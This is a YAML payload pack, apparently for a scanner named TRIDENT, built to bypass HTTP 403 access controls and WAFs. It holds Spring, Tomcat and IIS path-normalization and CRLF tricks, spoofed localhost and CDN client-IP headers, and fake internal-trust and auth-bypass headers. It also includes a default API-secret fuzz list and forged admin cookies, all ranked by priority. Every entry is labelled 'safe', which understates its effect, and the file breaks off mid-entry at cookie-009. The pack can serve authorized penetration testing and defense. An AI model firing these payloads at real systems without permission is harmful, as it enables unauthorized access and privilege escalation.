# =============================================================================
#  TRIDENT :: payloads/403-additions.yaml
#  Expansion Pack — Fills gaps in the base 403.yaml arsenal
# -----------------------------------------------------------------------------
#  Merge strategy: append every entry under `payloads:` in 403.yaml,
#  then replace the `meta.version` to "2.0.0".
#
#  What's new:
#    NEW CATEGORIES
#      - cookie_manipulation  : Session / role / auth cookie injection
#      - content_type_abuse   : WAF evasion via Content-Type tricks
#      - protocol_smuggling   : CL.TE / TE.CL / TE.TE (general, not HAProxy-only)
#    EXPANDED CATEGORIES
#      - path_manipulation    : Spring semicolon traversal, CRLF chars, IIS Unicode
#      - header_injection     : CDN IP headers, SSL-spoof, internal-trust headers
#      - auth_challenge       : JWT alg:none, bearer variants, cookie-session
#      - proxy_specific       : Traefik, Varnish, Caddy, Spring Boot, Express
#      - waf_specific         : ModSecurity, Akamai, generic WAF padding
#      - advanced_combination : 3-layer combos, smuggling+spoof, cookie+path
#    SCHEMA ADDITIONS
#      - `severity`            : info / low / medium / high / critical
#                                (impact if bypass succeeds)
#      - `priority`            : 1–10 (lower = try earlier; default 5)
#      - `requires_raw_socket` : true if TCP-level control is needed
#      - `cloud_platform`      : aws / azure / gcp / cloudflare / akamai / fastly
#      - `scanner_note`        : special handling hint for the scanner
#
#  ⚠  RISK LEVEL CORRECTION (existing payloads)
#      method-004 (PUT) and method-006 (DELETE) are currently marked
#      risk: "safe" — they are NOT safe; they can modify or destroy server
#      resources. Patch them to risk: "potentially_destructive" before
#      merging this file.
# =============================================================================

# ─────────────────────────────────────────────────────────────────────────────
#  SCHEMA NOTE
#  New fields used below (backward-compatible; scanners can ignore unknowns):
#
#    severity: info | low | medium | high | critical
#    priority: 1 (try first) … 10 (try last)
#    requires_raw_socket: false (default) | true
#    cloud_platform: cloudflare | akamai | fastly | awswaf | azurewaf | generic
#    scanner_note: free-text hint
# ─────────────────────────────────────────────────────────────────────────────

payloads:

  # ───────────────────────────────────────────────────────────────────────────
  #  PATH MANIPULATION — additions
  #  path-034 → path-051
  # ───────────────────────────────────────────────────────────────────────────

  - id: "path-034"
    name: "Tomcat leading semicolon"
    category: "path_manipulation"
    technique: "matrix-param"
    payload: "/;/{{PATH}}"
    description: >
      Leading semicolon before the path — Tomcat and some Spring setups strip it
      during request processing, but WAF ACLs see a path starting with ';' and
      don't match their /path rules. One of the highest-yield Tomcat bypasses.
    tags: ["tomcat", "spring", "matrix", "high-yield"]
    risk: "safe"
    severity: "high"
    priority: 1

  - id: "path-035"
    name: "Spring MVC semicolon traversal"
    category: "path_manipulation"
    technique: "matrix-param"
    payload: "/{{PATH}}/..;/"
    description: >
      Appends /..;/ after the protected path — Spring MVC strips the matrix
      parameter and normalizes the traversal, reaching the parent. The ACL sees
      /admin/..;/ and doesn't match /admin. Extremely common Spring Security
      misconfiguration (CVE class, widely exploited in bug bounty).
    tags: ["spring", "spring-security", "matrix", "traversal", "high-yield"]
    risk: "safe"
    severity: "high"
    priority: 1

  - id: "path-036"
    name: "Spring semicolon param prefix"
    category: "path_manipulation"
    technique: "matrix-param"
    payload: "/{{PATH}};x=y"
    description: >
      Arbitrary matrix param after path — Spring strips ;x=y before routing.
      Simpler variant of path-035; hit this before the traversal variant.
    tags: ["spring", "spring-security", "matrix"]
    risk: "safe"
    severity: "medium"
    priority: 2

  - id: "path-037"
    name: "Double trailing slash"
    category: "path_manipulation"
    technique: "trailing-slash"
    payload: "/{{PATH}}//"
    description: >
      Two trailing slashes — different normalization from a single slash.
      Some WAFs collapse // to / after matching, reaching a different backend route.
    tags: ["normalization", "trailing-slash"]
    risk: "safe"
    severity: "low"
    priority: 5

  - id: "path-038"
    name: "Current-directory segment suffix"
    category: "path_manipulation"
    technique: "dot-segment"
    payload: "/{{PATH}}/."
    description: >
      Trailing current-directory segment — RFC 3986 normalization removes it
      on the backend; WAF may not recognize /path/. as equivalent to /path.
    tags: ["normalization", "dot-segment", "rfc3986"]
    risk: "safe"
    severity: "low"
    priority: 5

  - id: "path-039"
    name: "Current-directory segment with slash"
    category: "path_manipulation"
    technique: "dot-segment"
    payload: "/{{PATH}}/./"
    description: >
      Current-directory plus trailing slash — normalizes to /path/ on backend.
      Different parser behavior than /path/. alone.
    tags: ["normalization", "dot-segment"]
    risk: "safe"
    severity: "low"
    priority: 5

  - id: "path-040"
    name: "LF prefix in path"
    category: "path_manipulation"
    technique: "crlf"
    payload: "/%0a/{{PATH}}"
    description: >
      Line-feed character before the path — some parsers treat %0a as a line
      terminator and restart path parsing, bypassing prefix-based ACL rules.
      Also useful for header injection via CRLF when reflected.
    tags: ["crlf", "control-char", "waf-bypass"]
    risk: "safe"
    severity: "medium"
    priority: 4

  - id: "path-041"
    name: "CRLF suffix in path"
    category: "path_manipulation"
    technique: "crlf"
    payload: "/{{PATH}}%0d%0a"
    description: >
      Carriage-return + line-feed appended to path — may split the request line
      in vulnerable parsers or bypass suffix-based WAF rules.
    tags: ["crlf", "control-char"]
    risk: "safe"
    severity: "medium"
    priority: 4

  - id: "path-042"
    name: "CR suffix in path"
    category: "path_manipulation"
    technique: "crlf"
    payload: "/{{PATH}}%0d"
    description: >
      Carriage-return only — some parsers differ from CRLF handling;
      worth fuzzing independently.
    tags: ["crlf", "control-char"]
    risk: "safe"
    severity: "low"
    priority: 6

  - id: "path-043"
    name: "URL-encoded fragment bypass"
    category: "path_manipulation"
    technique: "fragment"
    payload: "/{{PATH}}%23bypass"
    description: >
      URL-encoded '#' appended — browsers strip fragments, but HTTP clients
      pass %23 to the server. Some WAFs decode and then see a fragment boundary
      while the backend treats it as part of the path.
    tags: ["encoding", "fragment", "waf-bypass"]
    risk: "safe"
    severity: "medium"
    priority: 4

  - id: "path-044"
    name: "Semicolon + null byte combo"
    category: "path_manipulation"
    technique: "null-byte"
    payload: "/{{PATH}};%00"
    description: >
      Matrix param followed by a null byte — combines two truncation techniques.
      Older Java containers and PHP installations may truncate at the null
      after stripping the semicolon.
    tags: ["matrix", "null-byte", "combo", "legacy"]
    risk: "safe"
    severity: "medium"
    priority: 4

  - id: "path-045"
    name: "IIS Unicode escape — slash"
    category: "path_manipulation"
    technique: "unicode"
    payload: "/%u002F{{PATH}}"
    description: >
      IIS-specific %uXXXX Unicode escape for '/' — IIS decodes %u002F to '/'
      but many WAFs don't understand this encoding scheme.
    tags: ["iis", "unicode", "waf-bypass"]
    risk: "safe"
    severity: "medium"
    priority: 4

  - id: "path-046"
    name: "IIS Unicode escape — alphabetic chars"
    category: "path_manipulation"
    technique: "unicode"
    payload: "/%u0061%u0064%u006D%u0069%u006E"
    description: >
      Encode every character of the path segment in IIS %uXXXX notation —
      '%u0061%u0064%u006D%u0069%u006E' decodes to 'admin'. Pair with
      {{PATH_UNICODE_ESCAPED}} template variable in the scanner.
    tags: ["iis", "unicode", "full-path-encode"]
    risk: "safe"
    severity: "medium"
    priority: 4
    scanner_note: "Scanner must generate {{PATH_UNICODE_ESCAPED}} by encoding each char of the path as %uXXXX"

  - id: "path-047"
    name: "Overlong UTF-8 — alternate encoding"
    category: "path_manipulation"
    technique: "unicode"
    payload: "/%c1%9c{{PATH}}"
    description: >
      Alternate overlong UTF-8 encoding of '\\' (0x5C) treated as path separator
      by some legacy parsers. Complement to the existing %c0%af (overlong '/').
    tags: ["unicode", "overlong", "legacy"]
    risk: "safe"
    severity: "low"
    priority: 7

  - id: "path-048"
    name: "WAF padding — long random query"
    category: "path_manipulation"
    technique: "padding"
    payload: "/{{PATH}}?{{RAND_PARAM_64}}={{RAND_VALUE_64}}"
    description: >
      Append a long random query parameter — some WAFs have a max inspection
      length and stop inspecting after N bytes, letting the real path through.
      Scanner should generate a 64-char random key and value.
    tags: ["padding", "waf-bypass", "query"]
    risk: "safe"
    severity: "low"
    priority: 7
    scanner_note: "Generate {{RAND_PARAM_64}} and {{RAND_VALUE_64}} as 64-char random alphanumeric strings"

  - id: "path-049"
    name: "Trailing vertical bar"
    category: "path_manipulation"
    technique: "whitespace"
    payload: "/{{PATH}}|"
    description: >
      Pipe character at end of path — treated as part of the path by most
      servers but may split path matching in some WAF implementations.
    tags: ["control-char", "normalization"]
    risk: "safe"
    severity: "info"
    priority: 8

  - id: "path-050"
    name: "Tab prefix"
    category: "path_manipulation"
    technique: "whitespace"
    payload: "/%09{{PATH}}"
    description: >
      Tab character before the path — existing path-008 covers tab suffix;
      this covers the prefix variant used to confuse path-prefix ACLs.
    tags: ["whitespace", "control-char"]
    risk: "safe"
    severity: "low"
    priority: 6

  - id: "path-051"
    name: "Repeated dot-segment chain"
    category: "path_manipulation"
    technique: "dot-segment"
    payload: "/{{PATH}}/././././."
    description: >
      Multiple chained current-directory segments — stresses WAF regex patterns
      that only expect a single dot-segment; some implementations fail to
      fully normalize chains.
    tags: ["normalization", "dot-segment"]
    risk: "safe"
    severity: "low"
    priority: 7

  # ───────────────────────────────────────────────────────────────────────────
  #  HEADER INJECTION — additions
  #  hdr-ip-011 → hdr-ip-017, hdr-proto-001 → hdr-proto-004,
  #  hdr-trust-001 → hdr-trust-005, hdr-host-003 → hdr-host-005
  # ───────────────────────────────────────────────────────────────────────────

  # ── CDN / platform IP headers ─────────────────────────────────────────────

  - id: "hdr-ip-011"
    name: "CF-Connecting-IP localhost"
    category: "header_injection"
    technique: "ip-spoof"
    header: "CF-Connecting-IP"
    value: "127.0.0.1"
    description: >
      Cloudflare's real-client-IP header — Cloudflare sets this on every request.
      If the origin trusts it without validating it came from a Cloudflare IP,
      injecting it directly bypasses IP-based ACLs.
    tags: ["ip-spoof", "cloudflare", "cdn"]
    risk: "safe"
    severity: "high"
    priority: 2
    cloud_platform: "cloudflare"

  - id: "hdr-ip-012"
    name: "Fastly-Client-IP localhost"
    category: "header_injection"
    technique: "ip-spoof"
    header: "Fastly-Client-IP"
    value: "127.0.0.1"
    description: >
      Fastly CDN's client IP header — same pattern as CF-Connecting-IP but
      for Fastly-fronted origins.
    tags: ["ip-spoof", "fastly", "cdn"]
    risk: "safe"
    severity: "high"
    priority: 2
    cloud_platform: "fastly"

  - id: "hdr-ip-013"
    name: "Client-IP localhost"
    category: "header_injection"
    technique: "ip-spoof"
    header: "Client-IP"
    value: "127.0.0.1"
    description: >
      Generic Client-IP header — less common than X-Forwarded-For but trusted
      by some older load balancers and custom middleware.
    tags: ["ip-spoof", "load-balancer"]
    risk: "safe"
    severity: "medium"
    priority: 3

  - id: "hdr-ip-014"
    name: "X-Cluster-Client-IP localhost"
    category: "header_injection"
    technique: "ip-spoof"
    header: "X-Cluster-Client-IP"
    value: "127.0.0.1"
    description: >
      Cluster client IP header — used by some cloud platforms and container
      orchestrators (Heroku, some Kubernetes ingress controllers).
    tags: ["ip-spoof", "kubernetes", "heroku"]
    risk: "safe"
    severity: "medium"
    priority: 3

  - id: "hdr-ip-015"
    name: "X-Remote-Addr localhost"
    category: "header_injection"
    technique: "ip-spoof"
    header: "X-Remote-Addr"
    value: "127.0.0.1"
    description: >
      Remote address header — some custom middleware reads X-Remote-Addr
      for IP-based decisions rather than the socket's remote address.
    tags: ["ip-spoof", "custom-header"]
    risk: "safe"
    severity: "medium"
    priority: 4

  - id: "hdr-ip-016"
    name: "X-ProxyUser-Ip localhost"
    category: "header_injection"
    technique: "ip-spoof"
    header: "X-ProxyUser-Ip"
    value: "127.0.0.1"
    description: >
      ProxyUser-Ip header — occasionally used by internal proxies; seen
      in some Google infrastructure and enterprise reverse-proxy setups.
    tags: ["ip-spoof", "enterprise"]
    risk: "safe"
    severity: "low"
    priority: 5

  - id: "hdr-ip-017"
    name: "X-Forwarded-For shorthand 127.1"
    category: "header_injection"
    technique: "ip-spoof"
    header: "X-Forwarded-For"
    value: "127.1"
    description: >
      Shorthand IP notation — '127.1' expands to '127.0.0.1' on most POSIX
      stacks. Bypasses string-exact IP checks that only block '127.0.0.1'.
    tags: ["ip-spoof", "localhost", "shorthand"]
    risk: "safe"
    severity: "medium"
    priority: 3

  # ── SSL / scheme spoof headers ────────────────────────────────────────────

  - id: "hdr-proto-001"
    name: "X-Forwarded-Proto https"
    category: "header_injection"
    technique: "proto-spoof"
    header: "X-Forwarded-Proto"
    value: "https"
    description: >
      Tell the backend the connection is HTTPS — apps that restrict access
      to HTTPS-only paths (e.g. redirect HTTP to a login page) may unlock
      content when this header says the channel is already secure.
    tags: ["proto-spoof", "scheme", "ssl"]
    risk: "safe"
    severity: "medium"
    priority: 3

  - id: "hdr-proto-002"
    name: "X-Forwarded-Scheme https"
    category: "header_injection"
    technique: "proto-spoof"
    header: "X-Forwarded-Scheme"
    value: "https"
    description: >
      Alternative scheme header — some frameworks prefer X-Forwarded-Scheme
      over X-Forwarded-Proto.
    tags: ["proto-spoof", "scheme", "ssl"]
    risk: "safe"
    severity: "medium"
    priority: 3

  - id: "hdr-proto-003"
    name: "X-Forwarded-SSL on"
    category: "header_injection"
    technique: "proto-spoof"
    header: "X-Forwarded-SSL"
    value: "on"
    description: >
      SSL indicator header — used by some reverse proxies (notably older nginx
      configs) to signal that the upstream connection is TLS-terminated.
    tags: ["proto-spoof", "ssl", "nginx"]
    risk: "safe"
    severity: "low"
    priority: 5

  - id: "hdr-proto-004"
    name: "Front-End-Https on"
    category: "header_injection"
    technique: "proto-spoof"
    header: "Front-End-Https"
    value: "on"
    description: >
      Microsoft IIS / ARR SSL indicator — ARR sets this header to tell the
      backend IIS site that the front-end connection was HTTPS.
    tags: ["proto-spoof", "ssl", "iis", "arr"]
    risk: "safe"
    severity: "low"
    priority: 5

  # ── Internal / backend trust headers ──────────────────────────────────────

  - id: "hdr-trust-001"
    name: "X-Internal true"
    category: "header_injection"
    technique: "trust-spoof"
    header: "X-Internal"
    value: "true"
    description: >
      Generic internal-request flag — some apps expose debug endpoints or
      skip auth when they believe the request is from an internal network
      via this custom header.
    tags: ["trust-spoof", "internal", "custom-header"]
    risk: "safe"
    severity: "high"
    priority: 2

  - id: "hdr-trust-002"
    name: "X-Backend-Request true"
    category: "header_injection"
    technique: "trust-spoof"
    header: "X-Backend-Request"
    value: "true"
    description: >
      Backend-request marker — microservice architectures sometimes use this
      to identify service-to-service calls, skipping user-facing auth.
    tags: ["trust-spoof", "internal", "microservice"]
    risk: "safe"
    severity: "high"
    priority: 2

  - id: "hdr-trust-003"
    name: "X-Internal-Auth true"
    category: "header_injection"
    technique: "trust-spoof"
    header: "X-Internal-Auth"
    value: "true"
    description: >
      Internal auth bypass flag — seen in Jenkins, Grafana, and various
      self-hosted tools that expose internal-only APIs.
    tags: ["trust-spoof", "internal", "jenkins", "grafana"]
    risk: "safe"
    severity: "high"
    priority: 2

  - id: "hdr-trust-004"
    name: "X-Bypass-Auth true"
    category: "header_injection"
    technique: "trust-spoof"
    header: "X-Bypass-Auth"
    value: "true"
    description: >
      Auth bypass flag — some internal tooling or debug builds accept this
      header to skip authentication for automated testing. Should never
      reach production but sometimes does.
    tags: ["trust-spoof", "debug", "auth-bypass"]
    risk: "safe"
    severity: "high"
    priority: 2

  - id: "hdr-trust-005"
    name: "X-API-Secret default"
    category: "header_injection"
    technique: "trust-spoof"
    header: "X-API-Secret"
    value: "secret"
    description: >
      Default API secret probe — some apps use a shared secret header for
      service-to-service calls. Try common values: 'secret', 'api-secret',
      'internal', '1234'. Scanner should fuzz this field.
    tags: ["trust-spoof", "api", "default-creds"]
    risk: "safe"
    severity: "critical"
    priority: 2
    scanner_note: "Fuzz value with: secret, api-secret, internal, 1234, apikey, token, admin, changeme, password"

  # ── Real Host header manipulation ─────────────────────────────────────────

  - id: "hdr-host-003"
    name: "Host: 127.0.0.1"
    category: "header_injection"
    technique: "host-override"
    header: "Host"
    value: "127.0.0.1"
    description: >
      Override the actual Host header to 127.0.0.1 — unlike X-Forwarded-Host
      which is advisory, the Host header is authoritative. Some virtual-host
      configurations map 127.0.0.1 to an admin vhost.
    tags: ["host-override", "vhost", "localhost"]
    risk: "safe"
    severity: "medium"
    priority: 3
    scanner_note: "This changes the Host header itself, not just X-Forwarded-Host — the target may return a different vhost"

  - id: "hdr-host-004"
    name: "Host: localhost"
    category: "header_injection"
    technique: "host-override"
    header: "Host"
    value: "localhost"
    description: >
      Host header set to 'localhost' — some servers have a default vhost for
      'localhost' that bypasses authentication intended for the public hostname.
    tags: ["host-override", "vhost", "localhost"]
    risk: "safe"
    severity: "medium"
    priority: 3

  - id: "hdr-host-005"
    name: "Duplicate Host headers"
    category: "header_injection"
    technique: "host-override"
    headers:
      Host_primary: "{{TARGET_HOST}}"
      Host_duplicate: "localhost"
    description: >
      Send two Host headers — RFC 7230 forbids this but many servers still
      accept it, using either the first or the last value. WAFs typically
      inspect only the first; some backends use the last.
    tags: ["host-override", "header-pollution", "rfc7230-violation"]
    risk: "safe"
    severity: "high"
    priority: 2
    scanner_note: "Inject as two separate Host: headers in the raw request; the scanner must support raw header injection for this"
    requires_raw_socket: true

  # ───────────────────────────────────────────────────────────────────────────
  #  NEW CATEGORY: COOKIE MANIPULATION
  #  cookie-001 → cookie-010
  # ───────────────────────────────────────────────────────────────────────────

  - id: "cookie-001"
    name: "Cookie role=admin"
    category: "cookie_manipulation"
    technique: "cookie-injection"
    header: "Cookie"
    value: "role=admin"
    description: >
      Inject a role cookie — apps that perform RBAC based on a cookie value
      (without signing) are trivially bypassed. Try this before any session
      fixation attempts.
    tags: ["cookie", "rbac", "privilege-escalation"]
    risk: "safe"
    severity: "critical"
    priority: 1

  - id: "cookie-002"
    name: "Cookie is_admin=true"
    category: "cookie_manipulation"
    technique: "cookie-injection"
    header: "Cookie"
    value: "is_admin=true"
    description: >
      Admin boolean cookie — same pattern as role=admin but uses a boolean flag.
      Common in legacy PHP and simple Node.js apps.
    tags: ["cookie", "admin", "boolean"]
    risk: "safe"
    severity: "critical"
    priority: 1

  - id: "cookie-003"
    name: "Cookie admin=1"
    category: "cookie_manipulation"
    technique: "cookie-injection"
    header: "Cookie"
    value: "admin=1"
    description: >
      Integer admin flag cookie — numeric variant of the boolean admin check.
    tags: ["cookie", "admin", "integer"]
    risk: "safe"
    severity: "critical"
    priority: 1

  - id: "cookie-004"
    name: "Cookie user=admin"
    category: "cookie_manipulation"
    technique: "cookie-injection"
    header: "Cookie"
    value: "user=admin"
    description: >
      Set username cookie to 'admin' — apps that trust the username from a
      cookie without server-side session validation.
    tags: ["cookie", "user", "impersonation"]
    risk: "safe"
    severity: "critical"
    priority: 1

  - id: "cookie-005"
    name: "Cookie authenticated=true"
    category: "cookie_manipulation"
    technique: "cookie-injection"
    header: "Cookie"
    value: "authenticated=true"
    description: >
      Authentication state cookie — some apps store auth state in a plain
      cookie boolean that's checked server-side without validation.
    tags: ["cookie", "auth-state"]
    risk: "safe"
    severity: "critical"
    priority: 1

  - id: "cookie-006"
    name: "Cookie isAuthenticated=1"
    category: "cookie_manipulation"
    technique: "cookie-injection"
    header: "Cookie"
    value: "isAuthenticated=1"
    description: >
      Camel-case auth state variant — frameworks like Express and Django
      have been seen using this key name.
    tags: ["cookie", "auth-state", "express", "django"]
    risk: "safe"
    severity: "critical"
    priority: 1

  - id: "cookie-007"
    name: "Cookie session=admin"
    category: "cookie_manipulation"
    technique: "cookie-injection"
    header: "Cookie"
    value: "session=admin"
    description: >
      Set session cookie to literal 'admin' — tests whether the app blindly
      trusts the session cookie value without looking up a server-side store.
    tags: ["cookie", "session", "impersonation"]
    risk: "safe"
    severity: "high"
    priority: 2

  - id: "cookie-008"
    name: "Cookie accessLevel=admin"
    category: "cookie_manipulation"
    technique: "cookie-injection"
    header: "Cookie"
    value: "accessLevel=admin"
    description: >
      Access-level cookie — used by some custom RBAC implementations to
      store the user's tier (user / manager / admin) in a plain cookie.
    tags: ["cookie", "rbac", "access-level"]
    risk: "safe"
    severity: "critical"
    priority: 2

  - id: "cookie-009"
    name: "Cookie jwt_bypass — alg:none skeleton"
    category: "cookie_manipulation"
    technique: "cookie-jwt"
    header: "Cookie"
